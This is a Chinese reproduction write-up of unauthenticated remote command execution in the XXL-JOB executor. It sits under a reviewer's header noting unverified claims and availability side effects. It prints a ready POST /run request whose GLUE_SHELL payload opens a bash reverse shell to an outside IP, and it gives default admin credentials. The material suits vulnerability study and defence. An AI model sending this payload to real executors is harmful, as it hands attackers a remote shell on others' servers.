---
source: "MrWQ/vulnerability-paper"
product: "XXL-JOB / executor配置"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "XXL-JOB executor 未授权访问 RCE 漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：<=2.2.0笼统；实际/run REST示例2.2.0，旧版接口不同"
side_effects: "未执行；本文需注意的操作影响：实验可能打断既有任务；jobId1、COVER_EARLY、无超时及回连有可用性影响，缺清理"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/SQ7N52dizTC45oGI6gY3cg"
id: "vw-fe7bde725e188eeffc89d9e0"
entity_id: "ve-fe7bde725e188eeffc89d9e0"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：&lt;=2.2.0笼统；实际/run REST示例2.2.0，旧版接口不同

代码与实验材料：完整GLUE_SHELL请求和回连截图；原包头体缺空行，固定jobId/COVER_EARLY会干预任务

来源证据范围：微信原文，API说明无直接官方链接

- **结论使用边界（1）**：旧版范围与接口兼容性未区分；依据：610明确&lt;2.2.0无此REST路径，本篇却整个&lt;=2.2.0使用同包。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（2）**：默认无认证须限定配置；依据：只有未配置accessToken且执行器可达才成立，GLUE执行本身是功能。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **证据待核（3）**：实验可能打断既有任务；依据：jobId1、COVER_EARLY、无超时及回连有可用性影响，缺清理。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# XXL-JOB executor 未授权访问 RCE 漏洞

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SQ7N52dizTC45oGI6gY3cg)

**1、概述**  

XXL-JOB 是一个轻量级分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。XXL-JOB 分为 admin 和 executor 两端，前者为后台管理页面，后者是任务执行的客户端。executor 默认没有配置认证，未授权的攻击者可以通过 RESTful API 执行任意命令。此次漏洞核心问题是 GLUE 模式。XXL-JOB 通过 “GLUE 模式” 支持多语言以及脚本任务，该模式任务特点如下：

```
多语言支持：支持 Java、Shell、Python、NodeJS、PHP、PowerShell……等类型。
Web IDE：任务以源码方式维护在调度中心，支持通过 Web IDE 在线开发、维护。
动态生效：用户在线通过 Web IDE 开发的任务代码，远程推送至执行器，实时加载执行。

```

**2、漏洞影响版本**

影响版本： XXL-JOB <= 2.2.0

**3、漏洞复现过程**

XXL-JOB 的 Restful API 分为两种，一个 调度中心 Restful API，一个 执行器 Restful API。其中在执行器 Restful API 的任务触发声明中，发送请求的数据格式为：

```
地址格式：
    {执行器内嵌服务跟地址}/run   //也就是说为executor端的地址，ip:9999/run
Header：
    XXL-JOB-ACCESS-TOKEN : {请求令牌}   
请求数据格式如下，放置在 RequestBody 中，JSON格式：
{ 
    "jobId":1, // 任务ID 
    "executorHandler":"demoJobHandler", // 任务标识 
    "executorParams":"demoJobHandler", // 任务参数 
    "executorBlockStrategy":"COVER_EARLY", // 任务阻塞策略，可选值参考   com.xxl.job.core.enums.ExecutorBlockStrategyEnum 
    "executorTimeout":0, // 任务超时时间，单位秒，大于零时生效 
    "logId":1, // 本次调度日志ID 
    "logDateTime":1586629003729, // 本次调度日志时间 
    "glueType":"BEAN", // 任务模式，可选值参考 com.xxl.job.core.glue.GlueTypeEnum     "glueSource":"xxx", // GLUE脚本代码 
    "glueUpdatetime":1586629003727, // GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新 
    "broadcastIndex":0, // 分片参数：当前分片 
    "broadcastTotal":0 // 分片参数：总分片 
} 
响应数据格式：
    { "code": 200, // 200 表示正常、其他失败 "msg": null // 错误提示消息 }

```

可以直接向客户端发送如下数据包，即可执行命令, 这里复现我们直接通过反弹 shell 进行演示：

```
POST /run HTTP/1.1
Host: ip
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 365
{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "/bin/bash -i >& /dev/tcp/192.168.30.1/5555 0>&1",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}

```

首先访问复现环境。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmprZhKaxroGkLxbgq5wW3sqXBeV0KoYKwZ8JMCzgX2Ha285kkicsHzepbgYyVibe6brUawWygfyJLYQ/640?wx_fmt=png)

如果复现环境是自己搭建的，环境启动后，访问 `http://your-ip:8080` 即可查看到管理端（admin），访问 `http://your-ip:9999` 可以查看到客户端（executor）。默认登录账号口令是：“admin/123456”

访问环境后，接着使用 hackbar 发送 post 数据，进行反弹 shell 操作。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmprZhKaxroGkLxbgq5wW3sqVsf9mfNyoZxAfQzeqmnO6wPQicJysSZpV6ebdlMrbkgiaK4AHH59FQfw/640?wx_fmt=png)

点击执行后数据包发送成功，并成功反弹 shell。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmprZhKaxroGkLxbgq5wW3sqNcmw9XBgic3SYzQwCIa7VZun6srJyGdfwMkq0ZtZH5ibERqdjzicnuCBw/640?wx_fmt=png)

至此漏洞复现完毕。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmprZhKaxroGkLxbgq5wW3sqiaAnZ3O0nK1Led1URrZ6LucwS43eicjpyWDiciavENz75VL0ZEgPvKVjdw/640?wx_fmt=png)

**免责声明：  
**

**本公众号漏洞复现文章，SRC、渗透测试等文章，仅供学习参考，请勿用于实战！！有授权情况下除外！！由于传播、利用本公众号文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
